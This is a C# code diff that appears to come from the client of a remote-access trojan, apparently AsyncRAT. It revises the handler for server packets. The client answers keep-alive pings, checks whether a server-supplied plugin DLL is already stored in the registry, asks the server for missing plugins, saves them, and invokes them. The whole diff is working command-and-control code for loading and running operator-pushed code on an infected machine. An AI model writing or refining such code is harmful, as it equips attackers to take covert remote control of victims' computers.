@@ -24,11 +24,12 @@ namespace Client.Handle_Packet
                 {
                     case "pong": //send interval value to server
                         {
-                            int interval = (int)ClientSocket.Interval;
+                            ClientSocket.ActivatePong = false;
                             MsgPack msgPack = new MsgPack();
                             msgPack.ForcePathObject("Packet").SetAsString("pong");
-                            msgPack.ForcePathObject("Message").SetAsInteger(interval);
+                            msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
                             ClientSocket.Send(msgPack.Encode2Bytes());
+                            ClientSocket.Interval = 0;
                             break;
                         }
 
@@ -36,11 +37,7 @@ namespace Client.Handle_Packet
                         {
                             try
                             {
-                                Invoke(unpack_msgpack);
-                            }
-                            catch (Exception ex) // check if plugin is installed
-                            {
-                                if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null)
+                                if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
                                 {
                                     Packs.Add(unpack_msgpack); //save it for later
                                     MsgPack msgPack = new MsgPack();
@@ -49,12 +46,16 @@ namespace Client.Handle_Packet
                                     ClientSocket.Send(msgPack.Encode2Bytes());
                                 }
                                 else
-                                    Error(ex.Message);
+                                    Invoke(unpack_msgpack);
+                            }
+                            catch (Exception ex)
+                            {
+                                Error(ex.Message);
                             }
                             break;
                         }
 
-                    case "savePlugin": // save plugin as MD5:Base64
+                    case "savePlugin": // save plugin
                         {
                             SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                             Debug.WriteLine("plugin saved");
